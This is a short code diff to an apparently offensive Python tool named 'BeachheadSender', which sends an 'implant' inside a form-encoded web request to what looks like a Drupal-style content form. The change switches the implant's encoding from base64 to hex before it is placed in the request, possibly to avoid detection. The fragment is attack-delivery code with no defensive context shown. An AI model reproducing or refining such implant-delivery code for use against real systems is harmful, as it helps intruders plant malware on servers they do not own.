@@ -1,5 +1,6 @@
 import pathlib
 from base64 import b64encode
+import binascii
 
 import requests
 
@@ -67,8 +68,8 @@ class BeachheadSender:
             "Connection": "close",
         }
 
-        # The implant is encoded in base64 to make it easier to send in the request
-        implant = b64encode(self.implant.encode("utf-8")).decode("utf-8")
+        # The implant is encoded in hex to make it easier to send in the request
+        implant = binascii.hexlify(self.implant.encode("utf-8")).decode("utf-8")
 
         # The data from the initial request, with the implant added
         data = "title=Upload&body%5Bund%5D%5B0%5D%5Bsummary%5D=&body%5Bund%5D%5B0%5D%5B"
